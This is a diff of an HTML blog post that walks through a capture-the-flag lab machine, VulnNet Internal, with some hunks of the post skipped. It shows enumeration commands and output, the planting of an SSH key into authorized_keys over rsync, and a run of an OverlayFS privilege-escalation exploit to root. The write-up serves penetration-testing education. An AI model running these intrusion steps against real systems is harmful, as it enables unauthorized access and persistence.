 <pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="095a" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">❯ nmap -A -vv 10.10.96.14 &gt;nmap<br>.<br>.<br>.<br>NSE: Loaded 155 scripts for scanning.<br>NSE: Script Pre-scanning.<br>NSE: Starting runlevel 1 (of 3) scan.<br>Initiating NSE at 07:08<br>Completed NSE at 07:08, 0.00s elapsed<br>NSE: Starting runlevel 2 (of 3) scan.<br>Initiating NSE at 07:08<br>Completed NSE at 07:08, 0.00s elapsed<br>NSE: Starting runlevel 3 (of 3) scan.<br>Initiating NSE at 07:08<br>Completed NSE at 07:08, 0.00s elapsed<br>Initiating Ping Scan at 07:08<br>Scanning 10.10.96.14 [2 ports]<br>Completed Ping Scan at 07:08, 0.20s elapsed (1 total hosts)<br>Initiating Parallel DNS resolution of 1 host. at 07:08<br>Completed Parallel DNS resolution of 1 host. at 07:08, 0.03s elapsed<br>Initiating Connect Scan at 07:08<br>Scanning 10.10.96.14 [1000 ports]<br>Discovered open port 139/tcp on 10.10.96.14<br>Discovered open port 111/tcp on 10.10.96.14<br>Discovered open port 22/tcp on 10.10.96.14<br>Discovered open port 445/tcp on 10.10.96.14<br>Discovered open port 2049/tcp on 10.10.96.14<br>Discovered open port 873/tcp on 10.10.96.14<br>Increasing send delay for 10.10.96.14 from 0 to 5 due to max_successful_tryno increase to 4<br>Completed Connect Scan at 07:09, 34.33s elapsed (1000 total ports)<br>Initiating Service scan at 07:09<br>Scanning 6 services on 10.10.96.14<br>Completed Service scan at 07:09, 11.66s elapsed (6 services on 1 host)<br>NSE: Script scanning 10.10.96.14.<br>NSE: Starting runlevel 1 (of 3) scan.<br>Initiating NSE at 07:09<br>Completed NSE at 07:09, 6.47s elapsed<br>NSE: Starting runlevel 2 (of 3) scan.<br>Initiating NSE at 07:09<br>Completed NSE at 07:09, 0.43s elapsed<br>NSE: Starting runlevel 3 (of 3) scan.<br>Initiating NSE at 07:09<br>Completed NSE at 07:09, 0.00s elapsed<br>Nmap scan report for 10.10.96.14<br>Host is up, received conn-refused (0.21s latency).<br>Scanned at 2022–01–15 07:08:47 EST for 53s<br>Not shown: 990 closed tcp ports (conn-refused)<br>PORT STATE SERVICE REASON VERSION<br>22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>| 2048 5e:27:8f:48:ae:2f:f8:89:bb:89:13:e3:9a:fd:63:40 (RSA)<br>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDagA3GVO7hKpJpO1Vr6+z3Y9xjoeihZFWXSrBG2MImbpPH6jk+1KyJwQpGmhMEGhGADM1LbmYf3goHku11Ttb0gbXaCt+mw1Ea+K0H00jA0ce2gBqev+PwZz0ysxCLUbYXCSv5Dd1XSa67ITSg7A6h+aRfkEVN2zrbM5xBQiQv6aBgyaAvEHqQ73nZbPdtwoIGkm7VL9DATomofcEykaXo3tmjF2vRTN614H0PpfZBteRpHoJI4uzjwXeGVOU/VZcl7EMBd/MRHdspvULJXiI476ID/ZoQLT2zQf5Q2vqI3ulMj5CB29ryxq58TVGSz/sFv1ZBPbfOl9OvuBM5BTBV<br>| 256 f4:fe:0b:e2:5c:88:b5:63:13:85:50:dd:d5:86:ab:bd (ECDSA)<br>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNM0XfxK0hrF7d4C5DCyQGK3ml9U0y3Nhcvm6N9R+qv2iKW21CNEFjYf+ZEEi7lInOU9uP2A0HZG35kEVmuideE=<br>| 256 82:ea:48:85:f0:2a:23:7e:0e:a9:d9:14:0a:60:2f:ad (ED25519)<br>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJPRO3XCBfxEo0XhViW8m/V+IlTWehTvWOyMDOWNJj+i<br>111/tcp open rpcbind syn-ack 2–4 (RPC #100000)<br>| rpcinfo: <br>| program version port/proto service<br>| 100000 2,3,4 111/tcp rpcbind<br>| 100000 2,3,4 111/udp rpcbind<br>| 100000 3,4 111/tcp6 rpcbind<br>| 100000 3,4 111/udp6 rpcbind<br>| 100003 3 2049/udp nfs<br>| 100003 3 2049/udp6 nfs<br>| 100003 3,4 2049/tcp nfs<br>| 100003 3,4 2049/tcp6 nfs<br>| 100005 1,2,3 47846/udp6 mountd<br>| 100005 1,2,3 51893/tcp mountd<br>| 100005 1,2,3 52114/udp mountd<br>| 100005 1,2,3 54049/tcp6 mountd<br>| 100021 1,3,4 39323/udp nlockmgr<br>| 100021 1,3,4 41673/tcp nlockmgr<br>| 100021 1,3,4 41907/tcp6 nlockmgr<br>| 100021 1,3,4 59210/udp6 nlockmgr<br>| 100227 3 2049/tcp nfs_acl<br>| 100227 3 2049/tcp6 nfs_acl<br>| 100227 3 2049/udp nfs_acl<br>|_ 100227 3 2049/udp6 nfs_acl<br>139/tcp open netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br>445/tcp open netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)<br>873/tcp open rsync syn-ack (protocol version 31)<br>1086/tcp filtered cplscrambler-lg no-response<br>2049/tcp open nfs_acl syn-ack 3 (RPC #100227)<br>3945/tcp filtered emcads no-response<br>9090/tcp filtered zeus-admin no-response<br>56738/tcp filtered unknown no-response<br>Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br>Host script results:<br>|_clock-skew: mean: -6h20m03s, deviation: 34m38s, median: -6h00m03s<br>| nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br>| Names:<br>| VULNNET-INTERNA&lt;00&gt; Flags: &lt;unique&gt;&lt;active&gt;<br>| VULNNET-INTERNA&lt;03&gt; Flags: &lt;unique&gt;&lt;active&gt;<br>| VULNNET-INTERNA&lt;20&gt; Flags: &lt;unique&gt;&lt;active&gt;<br>| WORKGROUP&lt;00&gt; Flags: &lt;group&gt;&lt;active&gt;<br>| WORKGROUP&lt;1e&gt; Flags: &lt;group&gt;&lt;active&gt;<br>| Statistics:<br>| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00<br>| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00<br>|_ 00 00 00 00 00 00 00 00 00 00 00 00 00 00<br>| smb2-time: <br>| date: 2022–01–15T06:09:31<br>|_ start_date: N/A<br>| smb2-security-mode: <br>| 3.1.1: <br>|_ Message signing enabled but not required<br>| smb-security-mode: <br>| account_used: guest<br>| authentication_level: user<br>| challenge_response: supported<br>|_ message_signing: disabled (dangerous, but default)<br>| p2p-conficker: <br>| Checking for Conficker.C or higher…<br>| Check 1 (port 53408/tcp): CLEAN (Couldn't connect)<br>| Check 2 (port 34685/tcp): CLEAN (Couldn't connect)<br>| Check 3 (port 9485/udp): CLEAN (Failed to receive data)<br>| Check 4 (port 22333/udp): CLEAN (Failed to receive data)<br>|_ 0/4 checks are positive: Host is CLEAN or ports are blocked<br>| smb-os-discovery: <br>| OS: Windows 6.1 (Samba 4.7.6-Ubuntu)<br>| Computer name: vulnnet-internal<br>| NetBIOS computer name: VULNNET-INTERNAL\x00<br>| Domain name: \x00<br>| FQDN: vulnnet-internal</span></pre>
 <p id="d113" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">As you can see, multiple ports are open and different services are running on each port. First let’s enumerate the SMB shares using the following command:</p>
 <pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="5d8d" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">❯ smbmap -H 10.10.96.14<br>[+] Guest session   	IP: 10.10.96.14:445	Name: 10.10.96.14                                       <br>        Disk                                                  	Permissions	Comment<br>	----                                                  	-----------	-------<br>	print$                                            	NO ACCESS	Printer Drivers<br>	shares                                            	READ ONLY	VulnNet Business Shares<br>	IPC$                                              	NO ACCESS	IPC Service (vulnnet-internal server (Samba, Ubuntu))</span></pre>
-<h1 id="92aa" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj" data-selectable-paragraph="">First Flag</h1>
+<h2 id="92aa" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj">First Flag</h2>
 <p id="3ca8" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph="">Now let’s try anonymous access on SMB share “shares” using the following command.</p>
 <pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="89f1" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">❯ smbclient //10.10.96.14/shares<br>Enter WORKGROUP\sak's password: <br>Try "help" to get a list of possible commands.<br>smb: \&gt; ls<br>  .                                         <br>  ..                                        <br>  temp                               <br>  data                               <br>smb: \&gt;</span></pre>
 <p id="7cd5" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">We found three files in both temp and data directory and using the <code class="ff abm abn abo abp b">get</code> command we can download all the files in our local system. Just download all file and you got your first flag from those file.</p>
 <blockquote>
 <p id="87c2" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><em>Note: In one of the files we found our first flag. But the other two files didn’t have any useful information.</em></p>
 </blockquote>
-<h1 id="5133" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj" data-selectable-paragraph="">Second Flag</h1>
+<h2 id="5133" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj">Second Flag</h2>
 <p id="e4f1" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph="">Looking at the NMAP service scan from earlier, I saw that port 2049 was open and noticed that there was a lot of output for port 111. I can see in the output for port 111, that the service <strong class="ly kz">NFS </strong>was present in the output. This indicates that I might be able to list and download (and maybe upload) files.</p>
 <pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="07fb" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">❯ sudo showmount -e 10.10.96.14<br>[sudo] password for sak: <br>Export list for 10.10.96.14:<br>/opt/conf *</span></pre>
 <p id="4638" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we need to mount <code class="ff abm abn abo abp b">/opt/conf</code> in our local directory, and for that we need to create a mount point (directory) with the name mount0.</p>
@@ -756,7 +768,7 @@
 <pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="b46f" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">10.10.96.14:6379&gt; KEYS * 1) "int" 2) "internal flag" 3) "authlist" 4) "tmp" 5) "marketlist" 10.10.96.14:6379&gt;</span></pre>
 <p id="c96e" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Our second flag is present in the file named <code class="ff abm abn abo abp b">internal flag</code> and we can read it using the command:</p>
 <pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="79a3" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">GET "internal flag"</span></pre>
-<h1 id="207d" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj" data-selectable-paragraph="">User Flag</h1>
+<h2 id="207d" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj">User Flag</h2>
 <p id="ce1d" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph="">To find the type of a key in redis we run the command “type &lt;key_name&gt;”</p>
 <pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="5e83" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">10.10.96.14:6379&gt; type authlist<br>list</span></pre>
 <p id="52c6" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">We found that <code class="ff abm abn abo abp b">authlist</code> is a list type key and to read it's value we can run the following command:</p>
@@ -772,13 +784,13 @@
 <p id="04db" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">After the command is executed, all the files will be copied in <strong class="ly kz">/sys-internal/</strong> directory in our local system and there we found the user flag.</p>
 <p id="fe50" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph=""><em>Or you also use this command.</em></p>
 <pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="5777" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">$ rsync rsync://rsync-connect@10.10.96.14/files/sys-internal/ user.txt .</span></pre>
-<h1 id="3c26" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj" data-selectable-paragraph="">User Shell Access</h1>
+<h2 id="3c26" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj">User Shell Access</h2>
 <p id="4212" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph="">While enumerating <code class="ff abm abn abo abp b">sys-internal</code> files and directories, we found <code class="ff abm abn abo abp b">.ssh</code> directory and we know that using <code class="ff abm abn abo abp b">rsync</code> we can upload files. So we upload our <code class="ff abm abn abo abp b">id_rsa.pub</code> to the <code class="ff abm abn abo abp b">.ssh</code> directory using the command shown below.</p>
 <pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="2337" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">❯ rsync /home/sak/.ssh/id_rsa.pub rsync://rsync-connect@10.10.96.14/files/sys-internal/.ssh/authorized_keys<br>Password:<br>.<br>.<br>.<br>sent 661 bytes  received 144 bytes  84.74 bytes/sec<br>total size is 565  speedup is 0.70</span></pre>
 <p id="f459" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we can easily get user shell access by using <code class="ff abm abn abo abp b">id_rsa</code> private key.</p>
 <pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="01a6" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">❯ sudo ssh sys-internal@10.10.96.14 -i /home/sak/.ssh/id_rsa<br>[sudo] password for sak: .<br>.<br>.<br>.<br>sys-internal@vulnnet-internal:~$ id<br>uid=1000(sys-internal) gid=1000(sys-internal) groups=1000(sys-internal),24(cdrom)</span></pre>
 <p id="88c3" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we have a SSH access to the target machine.</p>
-<h1 id="30e9" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj" data-selectable-paragraph="">Privilege Escalation</h1>
+<h2 id="30e9" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj">Privilege Escalation</h2>
 <p id="2259" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph="">In here I upload “linpias.sh” script to identify What type of command I can run. I find os vertion “ubuntu 18.4”. we all know it have</p>
 <p id="b4ee" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph="">— OverlayFS PE <strong class="ly kz">Vulnerability.</strong></p>
 <p id="801b" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph="">Reference Link <a class="af rn" href="https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/" rel="noopener ugc nofollow" target="_blank">https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/</a></p>
@@ -798,7 +810,7 @@
 <p id="7a11" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now run the exploit..</p>
 <pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="d96e" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">❯sys-internal@vulnnet-internal:~$ ./exploit<br>bash-4.4# id<br>uid=1000(sys-internal) gid=1000(sys-internal) euid=0(root) groups=1000(sys-internal),24(cdrom)<br>bash-4.4# cd /root<br>bash-4.4# ls<br>root.txt<br>bash-4.4# cat root.txt |wc -c<br>38<br>bash-4.4#</span></pre>
 <p id="7dfc" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">We are root now and a very interesting room is completed!</p>
-<h3 id="e906" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj">In this room, we learned about —</h3>
+<h4 id="e906" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj">In this room, we learned about —</h4>
 <ul class="">
 <li id="e321" class="xw xx tu ly b xy abh ya yb yc abi ye yf abu abj yh yi abv abk yk yl abw abl yn yo yp acj ack acl bj" data-selectable-paragraph="">SMB service enumeration</li>
 <li id="5344" class="xw xx tu ly b xy acm ya yb yc acn ye yf abu aco yh yi abv acp yk yl abw acq yn yo yp acj ack acl bj" data-selectable-paragraph="">RPC Service enumeration</li>
@@ -806,6 +818,9 @@
 <li id="6e01" class="xw xx tu ly b xy acm ya yb yc acn ye yf abu aco yh yi abv acp yk yl abw acq yn yo yp acj ack acl bj" data-selectable-paragraph="">Team service Project and build configuration</li>
 <li id="1ce3" class="xw xx tu ly b xy acm ya yb yc acn ye yf abu aco yh yi abv acp yk yl abw acq yn yo yp acj ack acl bj" data-selectable-paragraph="">CVE-2021–3493 — OverlayFS PE Vulnerability</li>
 </ul>
+<p id="d210" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Thanks for Reading!!</strong></p>
+<p id="caaa" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Follow me on Twitter</strong>: <a class="af rn" href="https://twitter.com/sakibulalikhan" rel="noopener ugc nofollow" target="_blank">https://twitter.com/sakibulalikhan</a></p>
+<p id="a415" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Happy VulnNet Internal~</strong></p>
 <figure class="yq yr ys yt yu yv kl km paragraph-image"><a href="https://www.buymeacoffee.com/sakibulalikhan"></a></figure>
             ]]>
         </content>
